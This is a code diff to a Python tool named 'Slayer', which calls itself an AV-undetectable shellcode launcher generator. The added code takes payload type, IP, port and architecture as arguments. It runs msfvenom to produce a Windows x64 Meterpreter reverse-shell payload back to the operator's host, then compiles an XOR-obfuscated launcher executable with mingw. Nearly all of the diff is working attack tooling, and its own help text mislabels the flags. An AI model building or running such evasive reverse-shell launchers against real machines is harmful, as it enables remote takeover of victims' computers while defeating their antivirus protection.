@@ -4,6 +4,7 @@ import random
 import string
 import os
 import time
+import argparse
 
 
 def get_random_string():
@@ -88,7 +89,7 @@ int main(int argc, char** argv)
     template.close()
 
 
-def slayer():
+def slayer(payload_type, ip, port, arch):
     xorkey = get_random_string()
     buf = get_random_string()
     shellcode = get_random_string()
@@ -97,6 +98,9 @@ def slayer():
     print("[*] Generating code...")
     create_template()
     time.sleep(1)
+    venom = f"msfvenom -a {arch} --platform Windows -p windows/x64/meterpreter/reverse_{payload_type} LHOST={ip} LPORT={port} -f raw -o shellcode.raw"
+    print(venom)
+    os.system(venom)
     print("[*] Generating payload...")
     time.sleep(5)
     try:
@@ -159,7 +163,21 @@ banner ='''
 
 def main():
     print(banner)
-    slayer()
+    print("Additional options: -P for payload, -A for architecture, -p for port number, -i for IP address\n")
+    parser = argparse.ArgumentParser(description="Slayer: AV undetectable shellcode launcher generator", 
+    usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
+    parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
+    parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
+    parser.add_argument('-p', '--port', help="Port for payload", type=str, default=443)
+    parser.add_argument('-a', '--arch', help="Architecture for payload", type=str, default="x64")
+    args = parser.parse_args()
+    try:
+        slayer(args.type,args.ip, args.port, args.arch)
+        print("[*] Initialising slayer()")
+    except:
+        print("[*] slayer() failed? :(")
+        sys.exit(1)
+
     print("[+] Compiling...")
     application_name = get_random_string()
     os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe slayer.cpp -static-libstdc++ -static-libgcc")
